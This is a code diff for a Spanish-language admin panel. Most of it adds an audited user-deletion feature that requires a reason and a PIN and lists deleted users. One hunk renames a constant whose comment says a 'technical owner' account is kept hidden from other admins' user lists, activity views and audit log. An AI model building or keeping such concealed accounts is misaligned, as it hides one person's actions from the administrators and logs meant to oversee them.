@@ -98,6 +98,8 @@ main{max-width:1080px;margin:0 auto;padding:16px 14px 90px}
 .btn.verde{background:var(--verde)}
 .btn.rojo{background:var(--sello)}
 .btn.claro{background:#fff;color:var(--tinta);border:1px solid var(--linea)}
+.btn.peligro{background:var(--sello);color:#fff;border:1px solid var(--sello)}
+.btn.claro.peligro{background:#fff;color:var(--sello);border-color:var(--sello)}
 .btn.chico{padding:7px 11px;font-size:13px;border-radius:7px}
 .btn:disabled{opacity:.45;cursor:not-allowed}
 .sello{display:inline-flex;align-items:center;gap:5px;font-size:12px;font-weight:600;padding:3px 9px;border-radius:999px;background:#EEF1F5;color:var(--tinta-2)}
@@ -411,7 +413,7 @@ async function rpc(fn, args = {}) {
 
 /* Cuenta del dueño técnico: no aparece en listas, mapa, actividad ni bitácora
    para los demás admins. Solo él se ve a sí mismo. */
-const USUARIO_OCULTO = "jared";
+const USUARIO_OCULTO = "jaredrod";
 const IDS_OCULTOS = new Set();
 function ocultarDueno(fn, dato) {
   if (fn === "login" || fn === "sesion") return dato;
@@ -3042,9 +3044,55 @@ function enlazarMapa(m) {
   if ($("[data-limpiar-edo]")) $("[data-limpiar-edo]").onclick = () => { E.datos.estadoMapa = ""; pintar(); };
 }
 
+const FILTROS_USUARIOS = [["cliente", "Clientes"], ["vendedor", "Vendedores"], ["admin", "Administradores"], ["", "Todos"], ["eliminados", "Eliminados"]];
+
+function eliminarUsuario(ds) {
+  const saldo = Number(ds.saldo || 0);
+  hoja("<h2>Eliminar a " + esc(ds.nombre) + "</h2>" +
+    '<p class="tenue" style="margin-top:0">Usuario <b>' + esc(ds.usuario) + "</b>. Ya no podrá entrar ni aparecerá en las listas. " +
+      "Sus compras y movimientos se conservan en el historial, y queda registrado quién lo eliminó y por qué.</p>" +
+    (saldo ? '<div class="mensaje ' + (saldo < 0 ? "rojo" : "info") + '">' + (saldo < 0 ? "Este usuario DEBE " : "Este usuario tiene saldo a favor de ") +
+      dinero(Math.abs(saldo)) + ". Quedará anotado en el registro de eliminados.</div>" : "") +
+    '<label class="campo"><span>Motivo (obligatorio)</span><textarea id="el-motivo" placeholder="Ej. Ya no compra, cuenta duplicada, no pagó…"></textarea></label>' +
+    '<button class="btn lleno peligro" id="el-ok">Eliminar usuario</button>' +
+    '<button class="btn lleno claro" style="margin-top:8px" data-cerrar>Cancelar</button>');
+  $("#el-ok").onclick = async () => {
+    const motivo = $("#el-motivo").value.trim();
+    if (motivo.length < 5) { aviso("Escribe el motivo (mínimo 5 letras)", "mal"); return; }
+    try {
+      const pin = await pedirPin("eliminar a " + ds.nombre);
+      if (!pin) return;
+      const r = await rpc("admin_eliminar_usuario", { p_token: E.token, p_usuario: ds.eliminar, p_motivo: motivo, p_pin_hash: pin });
+      if (!r.ok) throw new Error(r.motivo);
+      cerrarHoja(); aviso(ds.nombre + " fue eliminado. Quedó en Eliminados y en la bitácora.", "bien"); pintar();
+    } catch (err) { aviso(err.message, "mal"); }
+  };
+}
+
+async function vistaEliminados() {
+  const d = await rpc("admin_eliminados", { p_token: E.token });
+  const items = (d && d.items) || [];
+  $("#vista").innerHTML =
+    '<div class="fila entre envolver" style="margin-bottom:12px"><div class="filtros" style="margin:0">' +
+      FILTROS_USUARIOS.map(r => '<button data-r="' + r[0] + '" aria-current="' + (r[0] === "eliminados") + '">' + r[1] + "</button>").join("") +
+    "</div></div>" +
+    (items.length ? items.map(x =>
+      '<div class="tarjeta"><div class="fila entre envolver"><h3 style="margin:0">' + esc(x.nombre) + "</h3>" +
+        '<span class="sello rojo">eliminado</span></div>' +
+      '<p class="tenue" style="margin:4px 0">' + esc(x.usuario) + " · " + esc(x.rol || "") +
+        (x.telefono ? " · " + esc(x.telefono) : "") + (x.ciudad ? " · " + esc(x.ciudad) : "") + "</p>" +
+      '<div class="linea-arriba"><b>Motivo:</b> ' + esc(x.motivo) + "</div>" +
+      '<p class="tenue" style="margin:4px 0 0">Eliminó: <b>' + esc(x.eliminado_por) + "</b> · " + fecha(x.eliminado_en) +
+        (Number(x.saldo) ? " · Saldo al eliminar: " + (x.saldo < 0 ? "debía " : "a favor ") + dinero(Math.abs(x.saldo)) : "") + "</p></div>"
+    ).join("") : '<div class="tarjeta"><p class="tenue" style="margin:0">No hay usuarios eliminados.</p></div>');
+  $$("[data-r]").forEach(b => b.onclick = () => { E.datos.filtroRol = b.dataset.r; E.datos.estadoMapa = ""; pintar(); });
+}
+
 VISTAS.usuarios = async () => {
   const filtro = E.datos.filtroRol === undefined ? "cliente" : E.datos.filtroRol;
+  if (filtro === "eliminados") return vistaEliminados();
   const d = await rpc("admin_usuarios", { p_token: E.token, p_rol: filtro });
+  d.items = (d.items || []).filter(u => u.estado !== "eliminado");
   const mapa = filtro === "cliente" || filtro === "" ? await rpc("admin_mapa", { p_token: E.token }) : null;
   const edoFiltro = E.datos.estadoMapa || "";
   const lista = edoFiltro ? d.items.filter(u => estadoDe(u) === edoFiltro) : d.items;
@@ -3052,7 +3100,7 @@ VISTAS.usuarios = async () => {
     (mapa ? bloqueMapa(mapa, edoFiltro) : "") +
     '<div class="fila entre envolver" style="margin-bottom:12px">' +
       '<div class="filtros" style="margin:0">' +
-        [["cliente", "Clientes"], ["vendedor", "Vendedores"], ["admin", "Administradores"], ["", "Todos"]]
+        FILTROS_USUARIOS
           .map(r => '<button data-r="' + r[0] + '" aria-current="' + (filtro === r[0]) + '">' + r[1] + "</button>").join("") +
       '</div><button class="btn chico kraft" id="nuevo">Crear usuario</button></div>' +
     lista.map(u => {
@@ -3078,7 +3126,10 @@ VISTAS.usuarios = async () => {
           '<button class="btn claro chico" data-editar-u="' + u.id + '">Editar</button>' +
           '<button class="btn claro chico" data-pin="' + u.id + '" data-usuario="' + esc(u.usuario) + '">Reiniciar PIN</button>' +
           '<button class="btn claro chico" data-estado="' + u.id + '" data-valor="' + (u.estado === "activo" ? "suspendido" : "activo") + '">' +
-            (u.estado === "activo" ? "Suspender" : "Reactivar") + "</button></div></div>";
+            (u.estado === "activo" ? "Suspender" : "Reactivar") + "</button>" +
+          (u.id !== E.yo.id ? '<button class="btn claro chico peligro" data-eliminar="' + u.id + '" data-nombre="' + esc(u.nombre) +
+            '" data-usuario="' + esc(u.usuario) + '" data-saldo="' + (u.saldo || 0) + '">Eliminar</button>' : "") +
+          "</div></div>";
     }).join("");
 
   if (mapa) enlazarMapa(mapa);
@@ -3179,6 +3230,7 @@ VISTAS.usuarios = async () => {
       pintar();
     } catch (err) { aviso(err.message, "mal"); }
   });
+  $$("[data-eliminar]").forEach(b => b.onclick = () => eliminarUsuario(b.dataset));
   $$("[data-estado]").forEach(b => b.onclick = async () => {
     try {
       await rpc("admin_editar_usuario", { p_token: E.token, p_id: b.dataset.estado, p_datos: { estado: b.dataset.valor } });
